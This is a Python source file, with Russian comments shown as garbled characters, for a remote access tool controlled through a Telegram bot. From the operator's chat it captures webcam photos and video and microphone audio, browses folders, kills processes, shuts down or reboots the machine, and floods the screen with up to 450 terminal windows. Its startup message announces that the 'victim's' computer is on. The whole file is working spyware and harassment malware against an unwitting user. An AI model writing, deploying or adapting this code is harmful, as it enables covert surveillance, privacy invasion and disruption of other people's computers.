import os
import sys
import time
import random
import shutil
import subprocess
import psutil
import platform
import threading
from cryptography.fernet import Fernet
import cv2
import pyaudio
import wave
import pyautogui
import ctypes
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = '–í–ê–®_–¢–û–ö–ï–ù_–ë–û–¢–ê'
ALLOWED_USER_IDS = [123456789]  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à ID –≤ Telegram
WEB_CAMERA_INDEX = 0  # –û–±—ã—á–Ω–æ 0 –¥–ª—è –≤–µ–±-–∫–∞–º–µ—Ä—ã –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
AUDIO_RECORD_CHUNK = 1024
AUDIO_RECORD_FORMAT = pyaudio.paInt16
AUDIO_RECORD_CHANNELS = 2
AUDIO_RECORD_RATE = 44100

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
current_directory = os.path.expanduser("~")
is_cursor_mad = False

def restricted(func):
    """–î–µ–∫–æ—Ä–∞—Ç–æ—Ä –¥–ª—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É"""
    def wrapped(update: Update, context: CallbackContext, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ALLOWED_USER_IDS:
            update.message.reply_text("–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω. –í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–≥–æ –±–æ—Ç–∞.")
            return
        return func(update, context, *args, **kwargs)
    return wrapped

@restricted
def start(update: Update, context: CallbackContext):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –ø—Ä–∏ –∫–æ–º–∞–Ω–¥–µ /start"""
    keyboard = [
        [InlineKeyboardButton("üñ• –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö", callback_data='pc_info')],
        [InlineKeyboardButton("üìÇ –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–∞–ø–æ–∫", callback_data='browse_dir')],
        [InlineKeyboardButton("üì∑ –§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã", callback_data='webcam_photo')],
        [InlineKeyboardButton("üé• –ó–∞–ø–∏—Å—å —Å –∫–∞–º–µ—Ä—ã", callback_data='webcam_record')],
        [InlineKeyboardButton("üé§ –ó–∞–ø–∏—Å—å —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞", callback_data='mic_record')],
        [InlineKeyboardButton("‚öôÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–æ–π", callback_data='system_controls')],
        [InlineKeyboardButton("üìä –ó–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã", callback_data='running_processes')],
        [InlineKeyboardButton("üí£ –†–∞–∑–Ω–æ–µ", callback_data='fun_stuff')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('–ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ, —Å—ç—Ä!', reply_markup=reply_markup)

def button_handler(update: Update, context: CallbackContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    query.answer()

    if query.data == 'pc_info':
        pc_info_menu(update, context)
    elif query.data == 'browse_dir':
        browse_dir_menu(update, context)
    elif query.data == 'webcam_photo':
        take_webcam_photo(update, context)
    elif query.data == 'webcam_record':
        context.bot.send_message(chat_id=query.message.chat_id, text="–í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö:")
        context.user_data['waiting_for'] = 'webcam_record_time'
    elif query.data == 'mic_record':
        context.bot.send_message(chat_id=query.message.chat_id, text="–í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö:")
        context.user_data['waiting_for'] = 'mic_record_time'
    elif query.data == 'system_controls':
        system_controls_menu(update, context)
    elif query.data == 'running_processes':
        show_running_processes(update, context)
    elif query.data == 'fun_stuff':
        fun_stuff_menu(update, context)
    elif query.data == 'back_to_main':
        start(update, context)

def pc_info_menu(update: Update, context: CallbackContext):
    """–ú–µ–Ω—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ü–ö"""
    keyboard = [
        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ
    uname = platform.uname()
    cpu_info = f"–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {uname.processor}\n–Ø–¥–µ—Ä: {psutil.cpu_count(logical=False)}\n–ü–æ—Ç–æ–∫–æ–≤: {psutil.cpu_count(logical=True)}"
    memory = psutil.virtual_memory()
    mem_info = f"–û–ó–£: {memory.total / (1024**3):.2f} GB\n–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è: {memory.percent}%"
    disk_info = ""
    for part in psutil.disk_partitions():
        usage = psutil.disk_usage(part.mountpoint)
        disk_info += f"\n–î–∏—Å–∫ {part.device}:\n  –í—Å–µ–≥–æ: {usage.total / (1024**3):.2f} GB\n  –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è: {usage.percent}%"
    
    message = (
        f"üíª –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ:\n"
        f"–°–∏—Å—Ç–µ–º–∞: {uname.system}\n"
        f"–í–µ—Ä—Å–∏—è: {uname.version}\n"
        f"–ú–∞—à–∏–Ω–∞: {uname.machine}\n\n"
        f"{cpu_info}\n\n"
        f"{mem_info}\n"
        f"{disk_info}"
    )
    
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=message, reply_markup=reply_markup)

def take_webcam_photo(update: Update, context: CallbackContext):
    """–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã"""
    try:
        cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
        ret, frame = cap.read()
        if ret:
            photo_path = os.path.join(os.getcwd(), "webcam_photo.jpg")
            cv2.imwrite(photo_path, frame)
            with open(photo_path, 'rb') as photo:
                context.bot.send_photo(chat_id=update.callback_query.message.chat_id, photo=photo)
            os.remove(photo_path)
        else:
            context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ.")
        cap.release()
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def record_webcam(update: Update, context: CallbackContext, duration: int):
    """–ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã"""
    try:
        cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        video_path = os.path.join(os.getcwd(), "webcam_video.avi")
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        
        cap.release()
        out.release()
        
        with open(video_path, 'rb') as video:
            context.bot.send_video(chat_id=update.message.chat_id, video=video)
        os.remove(video_path)
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def record_microphone(update: Update, context: CallbackContext, duration: int):
    """–ó–∞–ø–∏—Å–∞—Ç—å –∑–≤—É–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞"""
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=AUDIO_RECORD_FORMAT,
                           channels=AUDIO_RECORD_CHANNELS,
                           rate=AUDIO_RECORD_RATE,
                           input=True,
                           frames_per_buffer=AUDIO_RECORD_CHUNK)
        
        frames = []
        for _ in range(0, int(AUDIO_RECORD_RATE / AUDIO_RECORD_CHUNK * duration)):
            data = stream.read(AUDIO_RECORD_CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        audio_path = os.path.join(os.getcwd(), "microphone_record.wav")
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(AUDIO_RECORD_CHANNELS)
            wf.setsampwidth(audio.get_sample_size(AUDIO_RECORD_FORMAT))
            wf.setframerate(AUDIO_RECORD_RATE)
            wf.writeframes(b''.join(frames))
        
        with open(audio_path, 'rb') as audio_file:
            context.bot.send_audio(chat_id=update.message.chat_id, audio=audio_file)
        os.remove(audio_path)
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def system_controls_menu(update: Update, context: CallbackContext):
    """–ú–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–æ–π"""
    keyboard = [
        [InlineKeyboardButton("üîí –ó–∞–∫—Ä—ã—Ç—å —Ç–µ–∫—É—â–µ–µ –æ–∫–Ω–æ", callback_data='close_current_window')],
        [InlineKeyboardButton("üö´ –ó–∞–∫—Ä—ã—Ç—å –≤—Å–µ –æ–∫–Ω–∞", callback_data='close_all_windows')],
        [InlineKeyboardButton("üñº –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏", callback_data='change_wallpaper')],
        [InlineKeyboardButton("‚èª –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", callback_data='shutdown_pc')],
        [InlineKeyboardButton("üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö", callback_data='reboot_pc')],
        [InlineKeyboardButton("‚ùå –ó–∞–∫—Ä—ã—Ç—å –î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á", callback_data='close_task_manager')],
        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=reply_markup)

def shutdown_pc(update: Update, context: CallbackContext):
    """–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    confirmation_code = random.randint(10, 110)
    context.user_data['shutdown_code'] = confirmation_code
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text=f"–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥: {confirmation_code}\n"
                                "–ï—Å–ª–∏ –ø–µ—Ä–µ–¥—É–º–∞–ª–∏ - –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–∏–≥–Ω–æ—Ä–∏—Ä—É–π—Ç–µ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.")

def reboot_pc(update: Update, context: CallbackContext):
    """–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    try:
        if os.name == 'nt':
            os.system("shutdown /r /t 1")
        else:
            os.system("sudo shutdown -r now")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def close_current_window(update: Update, context: CallbackContext):
    """–ó–∞–∫—Ä—ã—Ç–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –æ–∫–Ω–∞"""
    try:
        if os.name == 'nt':
            # –î–ª—è Windows
            import win32gui
            import win32con
            window = win32gui.GetForegroundWindow()
            win32gui.PostMessage(window, win32con.WM_CLOSE, 0, 0)
        else:
            # –î–ª—è Linux (—Ç—Ä–µ–±—É–µ—Ç—Å—è xdotool)
            os.system("xdotool getwindowfocus windowkill")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–¢–µ–∫—É—â–µ–µ –æ–∫–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ.")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def close_all_windows(update: Update, context: CallbackContext):
    """–ó–∞–∫—Ä—ã—Ç–∏–µ –≤—Å–µ—Ö –æ–∫–æ–Ω"""
    try:
        if os.name == 'nt':
            # –î–ª—è Windows
            os.system("taskkill /F /IM explorer.exe")
            os.system("start explorer.exe")
        else:
            # –î–ª—è Linux (—Ç—Ä–µ–±—É–µ—Ç—Å—è wmctrl)
            os.system("wmctrl -c :ACTIVE:")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–í—Å–µ –æ–∫–Ω–∞ –∑–∞–∫—Ä—ã—Ç—ã.")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def change_wallpaper(update: Update, context: CallbackContext):
    """–°–º–µ–Ω–∞ –æ–±–æ–µ–≤"""
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∫–∞–∫ –æ–±–æ–∏.")
    context.user_data['waiting_for'] = 'wallpaper_image'

def set_wallpaper(update: Update, context: CallbackContext):
    """–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–æ–µ–≤ –∏–∑ –ø–æ–ª—É—á–µ–Ω–Ω–æ–≥–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è"""
    try:
        photo_file = update.message.photo[-1].get_file()
        wallpaper_path = os.path.join(os.getcwd(), "wallpaper.jpg")
        photo_file.download(wallpaper_path)
        
        if os.name == 'nt':
            # –î–ª—è Windows
            import win32gui
            import win32con
            import win32api
            SPI_SETDESKWALLPAPER = 20
            win32gui.SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper_path, win32con.SPIF_SENDWININICHANGE)
        else:
            # –î–ª—è Linux (—Ç—Ä–µ–±—É–µ—Ç—Å—è feh –∏–ª–∏ –ø–æ–¥–æ–±–Ω–æ–µ)
            os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{wallpaper_path}")
        
        context.bot.send_message(chat_id=update.message.chat_id, text="–û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω—ã.")
        os.remove(wallpaper_path)
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def browse_dir_menu(update: Update, context: CallbackContext):
    """–ú–µ–Ω—é –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –ø–∞–ø–æ–∫"""
    global current_directory
    
    try:
        items = os.listdir(current_directory)
        keyboard = []
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫–∏ –¥–ª—è –ø–∞–ø–æ–∫ –∏ —Ñ–∞–π–ª–æ–≤
        for item in items:
            full_path = os.path.join(current_directory, item)
            if os.path.isdir(full_path):
                keyboard.append([InlineKeyboardButton(f"üìÅ {item} (*–ø–∞–ø–∫–∞*)", callback_data=f'browse_{full_path}')])
            else:
                keyboard.append([InlineKeyboardButton(f"üìÑ {item}", callback_data=f'file_{full_path}')])
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫–∏ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏
        if current_directory != os.path.dirname(current_directory):
            keyboard.append([InlineKeyboardButton("‚¨ÜÔ∏è –ù–∞ —É—Ä–æ–≤–µ–Ω—å –≤—ã—à–µ", callback_data=f'browse_{os.path.dirname(current_directory)}')])
        
        keyboard.append([InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data='back_to_main')])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                                text=f"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–∞–ø–∫–∏: {current_directory}", 
                                reply_markup=reply_markup)
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def show_running_processes(update: Update, context: CallbackContext):
    """–ü–æ–∫–∞–∑–∞—Ç—å –∑–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"PID: {proc.info['pid']}, {proc.info['name']}")
        
        # –†–∞–∑–¥–µ–ª—è–µ–º –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ 20 –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —á—Ç–æ–±—ã –Ω–µ –ø—Ä–µ–≤—ã—Å–∏—Ç—å –ª–∏–º–∏—Ç Telegram
        for i in range(0, len(processes), 20):
            message = "\n".join(processes[i:i+20])
            context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=message)
        
        keyboard = [
            [InlineKeyboardButton("‚ùå –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å", callback_data='kill_process')],
            [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data='back_to_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                               text="–ß—Ç–æ–±—ã –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ PID:", 
                               reply_markup=reply_markup)
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def kill_process(update: Update, context: CallbackContext):
    """–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø–æ PID"""
    try:
        pid = int(update.message.text)
        os.kill(pid, 9)
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} –∑–∞–≤–µ—Ä—à–µ–Ω.")
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def fun_stuff_menu(update: Update, context: CallbackContext):
    """–ú–µ–Ω—é —Ä–∞–∑–Ω–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞"""
    keyboard = [
        [InlineKeyboardButton("üåÄ –ë–µ–∑—É–º–Ω—ã–π –∫—É—Ä—Å–æ—Ä", callback_data='crazy_cursor')],
        [InlineKeyboardButton("üí£ CMD –±–æ–º–±–∞", callback_data='cmd_bomb')],
        [InlineKeyboardButton("üìÄ –û—Ç–∫—Ä—ã—Ç—å –¥–∏—Å–∫–æ–≤–æ–¥", callback_data='open_cd_drive')],
        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text="–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", 
                           reply_markup=reply_markup)

def crazy_cursor(update: Update, context: CallbackContext):
    """–ë–µ–∑—É–º–Ω–æ–µ –¥–≤–∏–∂–µ–Ω–∏–µ –∫—É—Ä—Å–æ—Ä–∞"""
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text="–í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö) –¥–ª—è –±–µ–∑—É–º–Ω–æ–≥–æ –∫—É—Ä—Å–æ—Ä–∞:")
    context.user_data['waiting_for'] = 'crazy_cursor_time'

def run_crazy_cursor(update: Update, context: CallbackContext, duration: int):
    """–ó–∞–ø—É—Å–∫ –±–µ–∑—É–º–Ω–æ–≥–æ –∫—É—Ä—Å–æ—Ä–∞"""
    global is_cursor_mad
    is_cursor_mad = True
    
    def cursor_thread():
        start_time = time.time()
        while is_cursor_mad and (time.time() - start_time) < duration:
            x, y = pyautogui.position()
            new_x = x + random.randint(-50, 50)
            new_y = y + random.randint(-50, 50)
            pyautogui.moveTo(new_x, new_y, duration=0.1)
            time.sleep(0.1)
    
    threading.Thread(target=cursor_thread).start()
    context.bot.send_message(chat_id=update.message.chat_id, text=f"–ö—É—Ä—Å–æ—Ä –±—É–¥–µ—Ç –±–µ–∑—É–º–Ω—ã–º {duration} —Å–µ–∫—É–Ω–¥!")

def cmd_bomb(update: Update, context: CallbackContext):
    """CMD –±–æ–º–±–∞"""
    context.bot.send_message(chat_id=update.callback_query.message.chat_id, 
                           text="–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ CMD –æ–∫–æ–Ω (–º–∞–∫—Å. 450):")
    context.user_data['waiting_for'] = 'cmd_bomb_count'

def run_cmd_bomb(update: Update, context: CallbackContext, count: int):
    """–ó–∞–ø—É—Å–∫ CMD –±–æ–º–±—ã"""
    try:
        count = min(450, max(1, int(count)))
        for _ in range(count):
            if os.name == 'nt':
                os.system("start cmd")
            else:
                os.system("xterm &")
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—Ç–∫—Ä—ã—Ç–æ {count} CMD –æ–∫–æ–Ω!")
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def open_cd_drive(update: Update, context: CallbackContext):
    """–û—Ç–∫—Ä—ã—Ç–∏–µ –¥–∏—Å–∫–æ–≤–æ–¥–∞"""
    try:
        if os.name == 'nt':
            ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        else:
            os.system("eject /dev/cdrom")
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="–î–∏—Å–∫–æ–≤–æ–¥ –æ—Ç–∫—Ä—ã—Ç!")
    except Exception as e:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def handle_message(update: Update, context: CallbackContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
    if 'waiting_for' not in context.user_data:
        return
    
    waiting_for = context.user_data['waiting_for']
    
    try:
        if waiting_for == 'webcam_record_time':
            duration = int(update.message.text)
            if duration > 0:
                threading.Thread(target=record_webcam, args=(update, context, duration)).start()
                context.bot.send_message(chat_id=update.message.chat_id, text=f"–ù–∞—á–∏–Ω–∞—é –∑–∞–ø–∏—Å—å —Å –∫–∞–º–µ—Ä—ã –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥...")
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="–í—Ä–µ–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0 —Å–µ–∫—É–Ω–¥.")
        
        elif waiting_for == 'mic_record_time':
            duration = int(update.message.text)
            if duration > 0:
                threading.Thread(target=record_microphone, args=(update, context, duration)).start()
                context.bot.send_message(chat_id=update.message.chat_id, text=f"–ù–∞—á–∏–Ω–∞—é –∑–∞–ø–∏—Å—å —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥...")
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="–í—Ä–µ–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0 —Å–µ–∫—É–Ω–¥.")
        
        elif waiting_for == 'wallpaper_image':
            set_wallpaper(update, context)
        
        elif waiting_for == 'crazy_cursor_time':
            duration = int(update.message.text)
            if duration > 0:
                run_crazy_cursor(update, context, duration)
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="–í—Ä–µ–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0 —Å–µ–∫—É–Ω–¥.")
        
        elif waiting_for == 'cmd_bomb_count':
            run_cmd_bomb(update, context, update.message.text)
        
        elif waiting_for == 'shutdown_confirmation':
            if update.message.text == str(context.user_data.get('shutdown_code', '')):
                if os.name == 'nt':
                    os.system("shutdown /s /t 1")
                else:
                    os.system("sudo shutdown -h now")
                context.bot.send_message(chat_id=update.message.chat_id, text="–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
            else:
                context.bot.send_message(chat_id=update.message.chat_id, text="–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.")
        
        elif waiting_for == 'kill_process':
            kill_process(update, context)
        
        del context.user_data['waiting_for']
    except ValueError:
        context.bot.send_message(chat_id=update.message.chat_id, text="–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
    except Exception as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"–û—à–∏–±–∫–∞: {str(e)}")

def error_handler(update: Update, context: CallbackContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫"""
    print(f"–û—à–∏–±–∫–∞: {context.error}")
    if update and update.message:
        update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")

def main():
    """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
    # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
    if len(sys.argv) > 1 and sys.argv[1] == "startup":
        updater = Updater(BOT_TOKEN, use_context=True)
        for user_id in ALLOWED_USER_IDS:
            updater.bot.send_message(chat_id=user_id, text="–ö–æ–º–ø—å—é—Ç–µ—Ä –∂–µ—Ä—Ç–≤—ã –≤–∫–ª—é—á–µ–Ω, –Ω–∞–∂–º–∏—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã")
        return
    
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dp.add_error_handler(error_handler)
    
    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == "shutdown":
        updater = Updater(BOT_TOKEN, use_context=True)
        for user_id in ALLOWED_USER_IDS:
            updater.bot.send_message(chat_id=user_id, text="–≠—Ö, –∫–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è")
    else:
        main()